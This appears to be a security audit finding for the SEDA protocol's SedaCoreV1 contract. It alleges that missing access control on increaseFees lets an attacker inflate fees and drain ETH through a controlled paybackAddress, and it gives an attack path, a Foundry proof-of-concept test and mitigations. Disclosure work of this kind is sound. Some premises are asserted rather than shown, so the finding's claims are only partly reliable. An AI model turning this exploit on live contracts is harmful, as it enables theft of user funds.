# Unauthorized Fee Inflation Allows ETH Drain via Malicious Fee Manipulation

### Summary

The lack of access control in `SedaCoreV1::increaseFees` combined with default zero fees will cause a direct ETH loss for the protocol as an attacker can inflate fees for any pending request and redirect refunds to steal funds.

### Root Cause

- In (https://github.com/sherlock-audit/2024-12-seda-protocol/blob/051b5e88a2f530792913910ebf98c50f431b1e3b/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L206C1-L211C59), the `increaseFees` function lacks access control, allowing any user to add fees to any request.  
```solidity
    function increaseFees(
        bytes32 requestId,
        uint256 additionalRequestFee,
        uint256 additionalResultFee,
        uint256 additionalBatchFee
    ) external payable override(ISedaCore) whenNotPaused {
```

- In (https://github.com/sherlock-audit/2024-12-seda-protocol/blob/051b5e88a2f530792913910ebf98c50f431b1e3b/seda-evm-contracts/contracts/core/SedaCoreV1.sol#L88C1-L96C5), requests can be created with zero fees, creating a dependency on `increaseFees` for protocol economics.

```solidity
        return postRequest(inputs, 0, 0, 0);
    }


    function postRequest(
        SedaDataTypes.RequestInputs calldata inputs,
        uint256 requestFee,
        uint256 resultFee,
        uint256 batchFee
    ) public payable whenNotPaused returns (bytes32) {
```

### Internal Pre-conditions

1. A pending request exists in the contract (created by any user).  
2. The attacker has control over the `paybackAddress` field in the result submission (via a valid but malicious result).  
3. The contract holds ETH from fee deposits (both legitimate users and attackerâ€™s inflated fees).  

### External Pre-conditions

.

### Attack Path

1. **Attacker identifies a high-value pending request** (e.g., a DeFi price feed with existing fees).  
2. **Attacker inflates fees**: Calls `increaseFees` with high `additionalRequestFee`, `additionalResultFee`, and `additionalBatchFee`, sending ETH to the contract.  
3. **Attacker submits malicious result**: Submits a valid result with `paybackAddress` set to their address and `msg.sender = attacker`.  
4. **Fee distribution exploitation**:  
   - **Request Fee**: `(gasUsed * inflatedRequestFee) / gasLimit` is sent to `paybackAddress` (attacker).  
   - **Result Fee**: Full `resultFee` is sent to `msg.sender` (attacker).  
   - **Batch Fee**: If attacker submitted the batch, `batchFee` is sent to them.  
5. **Refund theft**: Excess fees from inflated values are refunded to the attacker via manipulated `paybackAddress`.  


### Impact

- **Protocol ETH Drain**: Attacker can steal **up to 100% of inflated fees** (including legitimate user deposits).  
- **Example Loss**: If a legitimate user deposits 3 ETH (1 ETH per fee type) and attacker inflates each fee by 1 ETH (total 6 ETH in contract), attacker can extract **6 ETH**, netting **3 ETH profit**.  

### PoC

```solidity
// Attacker inflates fees on victim's request
function testFeeDrain() public {
    // Victim creates request with 1 ETH fees
    vm.prank(victim);
    sedaCore.postRequest{value: 3 ether}(inputs, 1 ether, 1 ether, 1 ether);
    
    // Attacker inflates fees by 1 ETH each
    vm.prank(attacker);
    sedaCore.increaseFees{value: 3 ether}(requestId, 1 ether, 1 ether, 1 ether);
    
    // Attacker submits malicious result
    SedaDataTypes.Result memory maliciousResult = _buildResult(requestId);
    maliciousResult.paybackAddress = attackerAddressBytes; 
    vm.prank(attacker);
    sedaCore.postResult(maliciousResult, batchHeight, validProof);
    
    // Attacker gains 6 ETH (3 from victim, 3 from attacker's own deposit)
    assertEq(attacker.balance, 6 ether);
}```

### Mitigation

    Restrict increaseFees to Request Creator:
```solidity
   

    function increaseFees(...) external {
        if (msg.sender != requestDetails[requestId].requestor) revert Unauthorized();
        // ...
    }
```
    Enforce Minimum Initial Fees: Require non-zero fees at request creation.

    Validate paybackAddress: Ensure it matches the requestor or a pre-approved address.

    Cap Fee Increases: Implement a maximum allowable fee per request to limit exposure.

```solidity


uint256 constant MAX_FEE = 1 ether;
if (details.requestFee > MAX_FEE) revert FeeCapExceeded();
```
